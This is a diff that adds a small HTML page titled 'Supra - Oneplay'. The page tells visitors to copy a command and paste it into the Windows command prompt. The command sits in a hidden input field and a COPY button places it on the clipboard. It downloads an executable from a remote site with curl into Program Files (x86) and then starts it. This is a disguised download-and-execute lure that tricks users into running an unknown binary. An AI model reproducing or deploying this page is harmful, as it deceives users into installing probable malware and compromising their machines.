@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Supra - Oneplay</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background: url('https://cdn.dribbble.com/users/106600/screenshots/2156764/firefly2.gif') no-repeat center center fixed;
+            background-size: cover;
+            color: white;
+        }
+        .container {
+            text-align: center;
+            background: rgba(0, 0, 0, 0.5);
+            padding: 20px;
+            border-radius: 10px;
+        }
+        .copy-text {
+            display: none;
+        }
+        button {
+            background-color: #4CAF50;
+            border: none;
+            color: white;
+            padding: 10px 20px;
+            text-align: center;
+            text-decoration: none;
+            display: inline-block;
+            font-size: 16px;
+            margin: 4px 2px;
+            cursor: pointer;
+            border-radius: 5px;
+            transition: background-color 0.3s ease;
+        }
+        button:hover {
+            background-color: #45a049;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>SUPRA METHOD</h1>
+        <p>Copy this text and past it into the cmd</p>
+        <p id="textToCopy"> </p>
+         <input type="text" class="copy-text" value='cd "C:\Program Files (x86)" && curl -o Supra-Oneplay.exe https://spyderrock.com/iu5q8901-Supra-Oneplay.exe && start Supra-Oneplay.exe' id="copyInput">
+        <button onclick="copyText()">COPY</button>
+    </div>
+
+    <script>
+        function copyText() {
+            var copyInput = document.getElementById("copyInput");
+            copyInput.style.display = "block";
+            copyInput.select();
+            document.execCommand("copy");
+            copyInput.style.display = "none";
+            alert("Text copied to clipboard");
+        }
+    </script>
+</body>
+</html>
